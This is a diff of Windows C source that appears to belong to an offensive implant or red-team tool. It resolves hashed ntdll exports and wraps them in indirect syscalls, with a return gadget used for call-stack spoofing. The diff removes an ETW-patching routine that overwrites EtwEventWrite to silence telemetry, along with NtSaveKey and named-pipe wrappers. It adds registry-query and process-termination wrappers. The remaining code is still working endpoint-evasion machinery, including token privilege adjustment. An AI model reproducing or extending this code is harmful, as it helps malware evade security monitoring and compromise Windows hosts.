@@ -144,24 +144,19 @@ BOOL resolve_syscalls(void) {
     ok &= resolve_one(ntdll, H_NtQueryInformationProcess, &g_ssn.NtQueryInformationProcess, &g_addr.NtQueryInformationProcess);
     ok &= resolve_one(ntdll, H_NtCreateFile, &g_ssn.NtCreateFile, &g_addr.NtCreateFile);
     ok &= resolve_one(ntdll, H_NtWriteFile, &g_ssn.NtWriteFile, &g_addr.NtWriteFile);
-    ok &= resolve_one(ntdll, H_NtQuerySystemInformation, &g_ssn.NtQuerySystemInformation, &g_addr.NtQuerySystemInformation);
-    ok &= resolve_one(ntdll, H_NtProtectVirtualMemory, &g_ssn.NtProtectVirtualMemory, &g_addr.NtProtectVirtualMemory);
+    ok &= resolve_one(ntdll, H_NtReadFile, &g_ssn.NtReadFile, &g_addr.NtReadFile);
     ok &= resolve_one(ntdll, H_NtAllocateVirtualMemory, &g_ssn.NtAllocateVirtualMemory, &g_addr.NtAllocateVirtualMemory);
     ok &= resolve_one(ntdll, H_NtFreeVirtualMemory, &g_ssn.NtFreeVirtualMemory, &g_addr.NtFreeVirtualMemory);
-    ok &= resolve_one(ntdll, H_NtReadFile, &g_ssn.NtReadFile, &g_addr.NtReadFile);
-    ok &= resolve_one(ntdll, H_NtQueryInformationFile, &g_ssn.NtQueryInformationFile, &g_addr.NtQueryInformationFile);
     ok &= resolve_one(ntdll, H_NtSetInformationFile, &g_ssn.NtSetInformationFile, &g_addr.NtSetInformationFile);
+    ok &= resolve_one(ntdll, H_NtTerminateProcess, &g_ssn.NtTerminateProcess, &g_addr.NtTerminateProcess);
+    ok &= resolve_one(ntdll, H_NtFlushBuffersFile, &g_ssn.NtFlushBuffersFile, &g_addr.NtFlushBuffersFile);
     ok &= resolve_one(ntdll, H_NtOpenKey, &g_ssn.NtOpenKey, &g_addr.NtOpenKey);
-    ok &= resolve_one(ntdll, H_NtSaveKey, &g_ssn.NtSaveKey, &g_addr.NtSaveKey);
+    ok &= resolve_one(ntdll, H_NtQueryKey, &g_ssn.NtQueryKey, &g_addr.NtQueryKey);
+    ok &= resolve_one(ntdll, H_NtQueryValueKey, &g_ssn.NtQueryValueKey, &g_addr.NtQueryValueKey);
+    ok &= resolve_one(ntdll, H_NtEnumerateKey, &g_ssn.NtEnumerateKey, &g_addr.NtEnumerateKey);
     ok &= resolve_one(ntdll, H_NtOpenProcessToken, &g_ssn.NtOpenProcessToken, &g_addr.NtOpenProcessToken);
     ok &= resolve_one(ntdll, H_NtAdjustPrivilegesToken, &g_ssn.NtAdjustPrivilegesToken, &g_addr.NtAdjustPrivilegesToken);
-    ok &= resolve_one(ntdll, H_NtTerminateProcess, &g_ssn.NtTerminateProcess, &g_addr.NtTerminateProcess);
-    ok &= resolve_one(ntdll, H_NtFsControlFile, &g_ssn.NtFsControlFile, &g_addr.NtFsControlFile);
-    ok &= resolve_one(ntdll, H_NtFlushBuffersFile, &g_ssn.NtFlushBuffersFile, &g_addr.NtFlushBuffersFile);
-    ok &= resolve_one(ntdll, H_NtCreateNamedPipeFile, &g_ssn.NtCreateNamedPipeFile, &g_addr.NtCreateNamedPipeFile);
 
-    /* ret gadget for call stack spoofing: points to the C3 (ret) after
-       the 0F 05 (syscall) in any resolved Nt* stub — NtClose is always present */
     if (g_addr.NtClose)
         g_ret_gadget = (BYTE *)g_addr.NtClose + 2;
 
@@ -223,11 +218,12 @@ NTSTATUS sys_NtWriteFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
                            Buffer, Length, ByteOffset, Key);
 }
 
-NTSTATUS sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
-                                     PSIZE_T RegionSize, ULONG NewProtect,
-                                     PULONG OldProtect) {
-    return indirect_syscall_s2(g_ssn.NtProtectVirtualMemory, g_addr.NtProtectVirtualMemory,
-                           ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
+NTSTATUS sys_NtReadFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
+                         PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
+                         PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
+    return indirect_syscall_s7(g_ssn.NtReadFile, g_addr.NtReadFile,
+                           FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
+                           Buffer, Length, ByteOffset, Key);
 }
 
 NTSTATUS sys_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
@@ -244,22 +240,6 @@ NTSTATUS sys_NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                            ProcessHandle, BaseAddress, RegionSize, FreeType);
 }
 
-NTSTATUS sys_NtReadFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
-                         PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
-                         PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
-    return indirect_syscall_s7(g_ssn.NtReadFile, g_addr.NtReadFile,
-                           FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
-                           Buffer, Length, ByteOffset, Key);
-}
-
-NTSTATUS sys_NtQueryInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock,
-                                     PVOID FileInformation, ULONG Length,
-                                     DWORD FileInformationClass) {
-    return indirect_syscall_s2(g_ssn.NtQueryInformationFile, g_addr.NtQueryInformationFile,
-                           FileHandle, IoStatusBlock, FileInformation, Length,
-                           FileInformationClass);
-}
-
 NTSTATUS sys_NtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock,
                                    PVOID FileInformation, ULONG Length,
                                    DWORD FileInformationClass) {
@@ -268,15 +248,43 @@ NTSTATUS sys_NtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBl
                            FileInformationClass);
 }
 
+NTSTATUS sys_NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
+    return indirect_syscall(g_ssn.NtTerminateProcess, g_addr.NtTerminateProcess,
+                           ProcessHandle, (ULONG_PTR)ExitStatus);
+}
+
+NTSTATUS sys_NtFlushBuffersFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock) {
+    return indirect_syscall(g_ssn.NtFlushBuffersFile, g_addr.NtFlushBuffersFile,
+                           FileHandle, IoStatusBlock);
+}
+
 NTSTATUS sys_NtOpenKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess,
-                        POBJECT_ATTRIBUTES ObjectAttributes) {
+                       POBJECT_ATTRIBUTES ObjectAttributes) {
     return indirect_syscall(g_ssn.NtOpenKey, g_addr.NtOpenKey,
                            KeyHandle, DesiredAccess, ObjectAttributes);
 }
 
-NTSTATUS sys_NtSaveKey(HANDLE KeyHandle, HANDLE FileHandle) {
-    return indirect_syscall(g_ssn.NtSaveKey, g_addr.NtSaveKey,
-                           KeyHandle, FileHandle);
+NTSTATUS sys_NtQueryKey(HANDLE KeyHandle, ULONG KeyInformationClass,
+                        PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
+    return indirect_syscall_s2(g_ssn.NtQueryKey, g_addr.NtQueryKey,
+                           KeyHandle, KeyInformationClass, KeyInformation,
+                           Length, ResultLength);
+}
+
+NTSTATUS sys_NtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName,
+                              ULONG KeyValueInformationClass, PVOID KeyValueInformation,
+                              ULONG Length, PULONG ResultLength) {
+    return indirect_syscall_s2(g_ssn.NtQueryValueKey, g_addr.NtQueryValueKey,
+                           KeyHandle, ValueName, KeyValueInformationClass,
+                           KeyValueInformation, Length, ResultLength);
+}
+
+NTSTATUS sys_NtEnumerateKey(HANDLE KeyHandle, ULONG Index,
+                             ULONG KeyInformationClass, PVOID KeyInformation,
+                             ULONG Length, PULONG ResultLength) {
+    return indirect_syscall_s2(g_ssn.NtEnumerateKey, g_addr.NtEnumerateKey,
+                           KeyHandle, Index, KeyInformationClass,
+                           KeyInformation, Length, ResultLength);
 }
 
 NTSTATUS sys_NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
@@ -291,68 +299,4 @@ NTSTATUS sys_NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivi
     return indirect_syscall_s2(g_ssn.NtAdjustPrivilegesToken, g_addr.NtAdjustPrivilegesToken,
                            TokenHandle, (ULONG_PTR)DisableAllPrivileges, NewState,
                            BufferLength, PreviousState, ReturnLength);
-}
-
-NTSTATUS sys_NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
-    return indirect_syscall(g_ssn.NtTerminateProcess, g_addr.NtTerminateProcess,
-                           ProcessHandle, (ULONG_PTR)ExitStatus);
-}
-
-NTSTATUS sys_NtFsControlFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
-                              PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
-                              ULONG FsControlCode, PVOID InputBuffer,
-                              ULONG InputBufferLength, PVOID OutputBuffer,
-                              ULONG OutputBufferLength) {
-    return indirect_syscall_s7(g_ssn.NtFsControlFile, g_addr.NtFsControlFile,
-                           FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
-                           FsControlCode, InputBuffer, InputBufferLength,
-                           OutputBuffer, OutputBufferLength);
-}
-
-NTSTATUS sys_NtFlushBuffersFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock) {
-    return indirect_syscall(g_ssn.NtFlushBuffersFile, g_addr.NtFlushBuffersFile,
-                           FileHandle, IoStatusBlock);
-}
-
-NTSTATUS sys_NtCreateNamedPipeFile(PHANDLE FileHandle, ULONG DesiredAccess,
-                                    POBJECT_ATTRIBUTES ObjectAttributes,
-                                    PIO_STATUS_BLOCK IoStatusBlock,
-                                    ULONG ShareAccess, ULONG CreateDisposition,
-                                    ULONG CreateOptions, ULONG NamedPipeType,
-                                    ULONG ReadMode, ULONG CompletionMode,
-                                    ULONG MaximumInstances, ULONG InboundQuota,
-                                    ULONG OutboundQuota, PLARGE_INTEGER DefaultTimeout) {
-    return indirect_syscall_s10(g_ssn.NtCreateNamedPipeFile, g_addr.NtCreateNamedPipeFile,
-                           FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
-                           ShareAccess, CreateDisposition, CreateOptions, NamedPipeType,
-                           ReadMode, CompletionMode, MaximumInstances, InboundQuota,
-                           OutboundQuota, DefaultTimeout);
-}
-
-/* ── ETW patch ───────────────────────────────────────────── */
-
-BOOL patch_etw(void) {
-    PVOID ntdll = get_ntdll_base();
-    if (!ntdll) return FALSE;
-
-    PVOID etw_addr = get_export_by_hash(ntdll, H_EtwEventWrite);
-    if (!etw_addr) return FALSE;
-
-    PVOID base = etw_addr;
-    SIZE_T size = 4;
-    ULONG old_protect = 0;
-    NTSTATUS status = sys_NtProtectVirtualMemory(
-        (HANDLE)-1, &base, &size, 0x40 /*PAGE_EXECUTE_READWRITE*/, &old_protect);
-    if (status != 0) return FALSE;
-
-    BYTE patch[] = { 0x33, 0xC0, 0xC3, 0xCC };
-    ((BYTE *)etw_addr)[0] = patch[0];
-    ((BYTE *)etw_addr)[1] = patch[1];
-    ((BYTE *)etw_addr)[2] = patch[2];
-    ((BYTE *)etw_addr)[3] = patch[3];
-
-    sys_NtProtectVirtualMemory(
-        (HANDLE)-1, &base, &size, old_protect, &old_protect);
-
-    return TRUE;
 }
